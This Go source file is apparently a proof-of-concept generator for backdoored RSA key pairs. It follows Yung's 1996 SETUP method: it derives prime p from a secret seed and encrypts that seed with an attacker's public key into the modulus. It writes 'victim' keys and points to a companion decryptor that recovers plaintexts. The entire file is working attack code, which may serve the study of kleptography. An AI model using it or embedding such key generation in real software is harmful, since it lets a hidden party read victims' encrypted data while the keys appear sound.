package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha3"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"log"
	"math/big"
	"os"
	"path/filepath"
)

// --- Math utils --- //

// Check if a number is prime
func isPrime(n *big.Int) bool {
	return n.ProbablyPrime(20)
}

// Trapdoor function (SHA3-256)
func H(s string) *big.Int {
	hash := sha3.New256()
	hash.Write([]byte(s))
	return new(big.Int).SetBytes(hash.Sum(nil))
}

// Solver for q and r in (c || RND) = p * q + r
func solveForQandR(c *big.Int, RND *big.Int, p *big.Int, bitsize int) (*big.Int, *big.Int) {
	concat := new(big.Int).Lsh(c, uint(bitsize))
	concat.Add(concat, RND)
	q, r := new(big.Int), new(big.Int)
	q.DivMod(concat, p, r)
	return q, r
}

// --- GENERATOR --- //
// This function creates the backdoored RSA key pair using PK(N,E)

func GENERATOR(pubKey *rsa.PublicKey, bitsize int) (*big.Int, *big.Int, *big.Int, *big.Int, *big.Int) {

	fmt.Println("[*] Generating SETUP RSA key pair...")
	fmt.Printf("[*] This may take a while...\n")

	E := big.NewInt(int64(pubKey.E))
	attempts := 0

	// We run Yung's 1996 algorithm
	for {
		attempts++

		// 1. Choose secret s randomly, s < N
		maxS := new(big.Int).Sub(pubKey.N, big.NewInt(1))
		s, err := rand.Int(rand.Reader, maxS)
		if err != nil {
			log.Fatal(err)
		}

		// 2. Compute p = H(s), where H() is a trapdoor function
		p := H(s.String())

		// 3. Repeat until p is prime
		if !isPrime(p) {
			continue
		}

		// 4. Generate random <bits> sized z
		// In Yung 1996 => 1024 bits
		z, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), uint(bitsize)))
		if err != nil {
			log.Fatal(err)
		}

		// 5. Encrypt s with PK(N,E), return c = s**E%N
		c := new(big.Int).Exp(s, E, pubKey.N)

		// 6. Solve for q and r in (c || z) = p * q + r
		q, _ := solveForQandR(c, z, p, bitsize)

		// 7. If q not prime loop with new s
		if !isPrime(q) {
			continue
		}

		// 8. Compute n=p*q, e=2^16+1 (standard exponent)
		n := new(big.Int).Mul(p, q)
		e := big.NewInt(65537)

		// 9. Compute d as e*d ≡ 1 mod phi(n)
		pMinus := new(big.Int).Sub(p, big.NewInt(1))
		qMinus := new(big.Int).Sub(q, big.NewInt(1))
		phi := new(big.Int).Mul(pMinus, qMinus)

		d := new(big.Int).ModInverse(e, phi)
		if d == nil {
			continue
		}

		fmt.Printf("\n[+] Successfully generated backdoored key pair:\n")
		fmt.Printf("[+]  p bit length: %d\n", p.BitLen())
		fmt.Printf("[+]  q bit length: %d\n", q.BitLen())
		fmt.Printf("[+]  n bit length: %d\n", n.BitLen())
		fmt.Printf("[i]  Attempts needed: %d\n", attempts)

		return n, e, d, p, q
	}
}

// --- RSA key manipulation utils --- //

// Load public key from .pem file
func loadPublicKey(filename string) (*rsa.PublicKey, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	block, _ := pem.Decode(data)
	if block == nil {
		return nil, fmt.Errorf("[!] Failed to parse PEM block")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("[!] Not an RSA public key")
	}

	return rsaPub, nil
}

// Export SETUP Keys, these are backdoored and returned to user
func saveKeys(outputDir string, n, e, d, p, q *big.Int, bitsize int) error {
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return err
	}

	privKey := &rsa.PrivateKey{
		PublicKey: rsa.PublicKey{
			N: n,
			E: int(e.Int64()),
		},
		D:      d,
		Primes: []*big.Int{p, q},
	}

	// Save private key
	privKey.Precompute()
	privBytes := x509.MarshalPKCS1PrivateKey(privKey)
	privPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privBytes,
	})
	privPath := filepath.Join(outputDir, "victim_priv.pem")
	if err := os.WriteFile(privPath, privPEM, 0600); err != nil {
		return err
	}

	// Save public key
	pubBytes, err := x509.MarshalPKIXPublicKey(&privKey.PublicKey)
	if err != nil {
		return err
	}
	pubPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: pubBytes,
	})
	pubPath := filepath.Join(outputDir, "victim_pub.pem")
	if err := os.WriteFile(pubPath, pubPEM, 0644); err != nil {
		return err
	}

	// Save bitsize metadata for decryptor
	metadataPath := filepath.Join(outputDir, "metadata.txt")
	metadata := fmt.Sprintf("bitsize=%d\n", bitsize)
	if err := os.WriteFile(metadataPath, []byte(metadata), 0644); err != nil {
		return err
	}

	fmt.Printf("\n[+] Backdoored keys saved to:\n")
	fmt.Printf("[+]  Private key: %s\n", privPath)
	fmt.Printf("[+]  Public key:  %s\n", pubPath)
	fmt.Printf("[*]  Metadata:    %s\n", metadataPath)

	return nil
}

func main() {

	attackerPubKey := flag.String("pk", "", "Path to attacker's PK(N,E) (.pem)")
	outputDir := flag.String("o", "out", "Output directory for backdoored pair")
	bitsize := flag.Int("bits", 512, "Bit size for z. Size increase computation time.")

	flag.Parse()
	if *attackerPubKey == "" {
		fmt.Println("\n[*] Usage: generator -pk <attacker_pub.pem> -o <output_dir>\n")
		flag.PrintDefaults()
		fmt.Println("\n[*] Generate PK(N,E), SK(D) with :\n")
		fmt.Println("    openssl genrsa -out attacker_priv.pem 2048")
		fmt.Println("    openssl rsa -in attacker_priv.pem -pubout -out attacker_pub.pem")
		os.Exit(1)
	}

	// Load PK, SK
	fmt.Println("[*] Loading attacker's key...")
	pubKey, err := loadPublicKey(*attackerPubKey)
	if err != nil {
		log.Fatalf("[!] Failed to load public key: %v", err)
	}

	fmt.Printf("[+] Attacker's key loaded (N bit length: %d)\n", pubKey.N.BitLen())
	fmt.Printf("[*] Using bitsize: %d\n\n", *bitsize)

	// Run SETUP algorithm
	n, e, d, p, q := GENERATOR(pubKey, *bitsize)
	if err := saveKeys(*outputDir, n, e, d, p, q, *bitsize); err != nil {
		log.Fatalf("[!] Failed to save keys: %v", err)
	}

	fmt.Println("\n[+] SETUP backdoored key pair generated successfully!")
	fmt.Println("\n[i] To test encryption run:")
	fmt.Printf("  echo -n \"hello world\" | openssl pkeyutl -encrypt -inkey %s/victim_pub.pem -pubin -out %s/cipher.bin\n", *outputDir, *outputDir)
	fmt.Println("\n[i] To test SETUP backdoor run:")
	fmt.Printf("  ./decryptor -pk %s/victim_pub.pem -sk <attacker_priv.pem> -c %s/cipher.bin\n", *outputDir, *outputDir)
}
